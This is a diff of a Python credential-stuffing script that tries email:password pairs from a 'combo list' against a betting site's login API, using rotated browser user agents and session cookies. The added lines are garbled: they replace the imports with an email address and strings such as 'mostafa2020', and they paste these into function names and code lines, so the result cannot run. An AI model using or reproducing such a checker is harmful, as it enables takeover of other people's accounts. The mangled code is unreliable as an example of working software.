@@ -1,7 +1,7 @@
-import requests, os
-import json
-import random
-import time
+import mosiii.00@gmail.com
+import mostafa2020
+import 10000000
+import hotbet
 user_agents = [
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
@@ -16,7 +16,7 @@ user_agents = [
     'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
     "Mozilla/5.0 (Linux; Android 5.1.1; SM-J500H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",
 ]
-def login(combo, cookies):
+def mosiii.00@gmail.comlogin(combo, cookies):
     url = "https://5484hbthttkk.com/api/V1L3VzZXIvYXV0aC9sb2dpbg%3D%3D"
     headers = {
         "Host": "5484hbthttkk.com",
@@ -49,9 +49,10 @@ def main():
     print(b)
     combo_list = open(input("\033[93m[\033[91m*\033[93m]\033[96m Enter The Combo List: "), "r").read().splitlines()  
     session = requests.Session()
-    session.get("https://5484hbthttkk.com")
-    cookies = [{cookie.name: cookie.value} for cookie in session.cookies]
-    for combo in combo_list:
+    session.get("https://5484hbthttkk.com")mosiii.00@gmail.com
+    cookies = [{cookie.name: cookie.value} for cookie in session.cookies]mostafa2020
+    for combo in combo_list:10000000
+    mosiii.00@gmail.com
         time.sleep(random.randint(0, 1)/100)
         response = login(combo, session.cookies)
         result = json.loads(response.text)['result']
